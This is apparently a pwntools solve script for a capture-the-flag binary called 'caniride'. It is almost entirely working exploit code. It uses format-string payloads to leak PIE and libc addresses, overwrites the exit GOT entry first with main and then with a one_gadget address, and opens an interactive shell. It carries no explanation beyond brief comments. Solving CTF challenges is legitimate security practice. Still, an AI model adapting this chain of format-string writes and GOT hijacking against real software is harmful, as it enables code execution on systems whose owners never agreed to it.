#!/usr/local/bin/python3

'''
solve the caniride problem
'''

from pwn import *

conn = process('./caniride')

def get_shorts(target_value):
    shorts = []
    curr = 0
    for _ in range(4):
        num = target_value % 65536
        desired_value = (num - curr + 65536) % 65536
        shorts.append(desired_value)
        curr = (curr + desired_value) % 65536
        target_value = target_value >> 16
    return shorts

# First loop, get PIE leak and overwrite exit GOT with main
conn.recvuntil(b"Name: ")
fmt_payload = "%*20$x%16$hn"
fmt_payload += "%*21$x%17$hn"
fmt_payload += "%*22$x%18$hn"
fmt_payload += "%*23$x%19$hn"
conn.sendline(fmt_payload)
conn.recvuntil(b"driver: ")
conn.sendline(b"-3")
leak_line = conn.recvuntil(b"yourself: ")
pie_leak = leak_line[12:leak_line.find(b" your driver")]
pie_leak = u64(pie_leak + b"\x00"*(8-len(pie_leak)))
pie_base = pie_leak - 0x1035a8
log.info("PIE leak: 0x{:x}".format(pie_leak))
exit_got = pie_base + 0x103550
main_addr = pie_base + 0x101269
buf_payload = p64(exit_got) + p64(exit_got + 2) + p64(exit_got + 4) + p64(exit_got + 6)
shorts = get_shorts(main_addr)
buf_payload += p64(shorts[0]) + p64(shorts[1]) + p64(shorts[2]) + p64(shorts[3])
log.info("Overwrite the exit_got to main address!")
conn.sendline(buf_payload)

# Second loop, get libc leak
conn.recvuntil(b"Name: ")
fmt_leak_payload = "%16$s"
conn.sendline(fmt_leak_payload)
conn.recvuntil(b"driver: ")
conn.sendline(b"0") # we don't care about the driver anymore
conn.recvuntil(b"yourself: ")
printf_got = pie_base + 0x103528
buf_leak_payload = p64(printf_got)
log.info("Use format string vuln to leak libc base")
conn.sendline(buf_leak_payload)
leak_line = conn.recvuntil(b"Name: ")
libc_leak = leak_line[leak_line.find(b"Bye, ")+5:leak_line.find(b"!\nWelc")]
printf_addr = u64(libc_leak + b"\x00"*(8-len(libc_leak)))
libc_base = printf_addr - 0x61cc0
log.info("libc leak: 0x{:x}".format(libc_base))

# Third loop, overwrite exit GOT with one_gadget and get shell
conn.sendline(fmt_payload)
conn.recvuntil(b"driver: ")
conn.sendline(b"0")
conn.recvuntil(b"yourself: ")
buf_payload = p64(exit_got) + p64(exit_got + 2) + p64(exit_got + 4) + p64(exit_got + 6)
one_gadget = libc_base + 0xe3b31
shorts = get_shorts(one_gadget)
buf_payload += p64(shorts[0]) + p64(shorts[1]) + p64(shorts[2]) + p64(shorts[3])
conn.sendline(buf_payload)
conn.interactive()